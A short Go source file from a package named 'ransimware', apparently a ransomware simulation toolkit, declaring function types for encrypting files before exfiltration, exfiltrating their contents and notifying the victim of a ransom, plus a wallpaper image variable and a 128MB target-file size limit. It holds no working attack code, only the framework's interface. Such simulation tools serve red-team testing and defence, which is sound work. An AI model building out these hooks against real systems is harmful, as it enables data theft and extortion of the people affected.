package ransimware

// EncryptFunc defines a function pointer that can be used to encrypt
// file contents before exfil.
type EncryptFunc func(fn string, b []byte) ([]byte, error)

// ExfilFunc defines a function pointer that can be used to exil file
// contents.
type ExfilFunc func(fn string, b []byte) error

// NotifyFunc defines a function pointer that can be used to notify
// the user of the ransom.
type NotifyFunc func() error

// DefaultPNG is an example PNG for use with WallpaperNotify().
var DefaultPNG []byte

// MaxSize of files to target (default: 128MB).
var MaxSize int64 = 128 * 1024 * 1024

// Version is the package version
const Version = "0.9.3"
